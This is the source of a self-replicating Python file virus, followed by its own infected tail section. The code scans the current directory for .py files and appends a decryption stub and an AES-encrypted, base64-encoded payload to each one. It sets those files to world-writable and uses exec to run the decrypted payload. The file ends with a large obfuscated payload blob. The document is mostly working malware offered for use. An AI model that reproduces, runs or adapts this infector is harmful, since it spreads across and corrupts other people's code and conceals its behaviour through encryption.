import os
def is_infected(filename):
   f = open(filename, 'r')
   lines = f.readlines()
   if len(lines) < 46:
      return False
   #print len(lines)
   #print lines[len(lines) - 46]
   return lines[len(lines) - 46].startswith('######################################################## First script python')

def infect(filename):
   os.rename(filename, filename + '-copy')

   destination = open(filename, 'w')
   os.chmod(filename, 0777)
   source = open(filename + '-copy', 'r')
   this = open(__main__.__file__, 'r')

   # Append the original file
   for line in source:
      destination.write(line)

   destination.write("\n######################################################## First script python\n")
   destination.write("# coding=utf-8\n")
   destination.write("# Start Unencrypted\n")

   copy = False
   result = ''
   for line in this:
      if line.strip() == '# Start Unencrypted':
         copy = True
      elif line.strip() == '# End Unencrypted':
         destination.write('# End Unencrypted')
         copy = False
      elif copy:
         destination.write(line);

   destination.write("\n# Start payload\n")
   destination.write("#")
   destination.write(str(encrypt(e, filename)))
   destination.write("\n# End payload")

   os.remove(filename + '-copy')
   source.close()
   destination.close()
   this.close()

def find_and_infect_files():
   # In the current directory
   path = '.'
   dirs = os.listdir(path)

   # For each file try to infect it
   for filename in dirs:
      if filename.endswith('.py') and (not is_infected(filename)):
         print "Infected " +  str(filename)
         infect(filename)

def encrypt(data,filename):
   source = open(filename + '-copy', 'r')

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(source).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   source.close()
   return base64.b64encode(encrypted)
 ####################

def payload():
   print "This file is infected infected! Mhuahauhauahau!"

find_and_infect_files()
payload()
######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload